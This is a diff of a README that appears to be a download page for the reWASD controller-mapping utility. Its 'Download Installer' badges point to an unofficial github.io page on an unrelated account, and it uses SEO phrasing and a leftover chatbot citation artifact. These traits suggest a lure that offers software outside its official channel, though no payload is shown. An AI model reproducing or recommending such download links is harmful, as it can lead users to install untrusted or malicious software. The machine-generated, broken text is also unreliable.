@@ -1,7 +1,7 @@
 # Download reWASD Input Mapping Utility for Windows
 
 <div align="center">
-<img src="" alt="reWASD Logo" width="560">
+<img src="" alt="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/3337520/e895bfa855b4780b5cf06869838b4f5beb9ce503/capsule_616x353.jpg?t=1740406195" width="750">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download%20for-Windows-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://jesusfrostball3.github.io/.github/ReWASD-Controller-Utility)
@@ -21,7 +21,7 @@ Searches related to **rewasd valorant download** generally focus on controller c
 Designed specifically for Windows, the software combines controller management, profile organization, input customization, and automation tools into a unified interface suitable for both casual and advanced users. :contentReference[oaicite:4]{index=4}
 
 <div align="center">
-<img src="" alt="reWASD Screenshot" width="900">
+<img src="" alt="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHfr5Gq1a0paIxovt3uipBqaSMAYuuy_jwFnaunE87aXpTEJuJIjf9mppY&s=10" width="750">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://jesusfrostball3.github.io/.github/ReWASD-Controller-Utility)
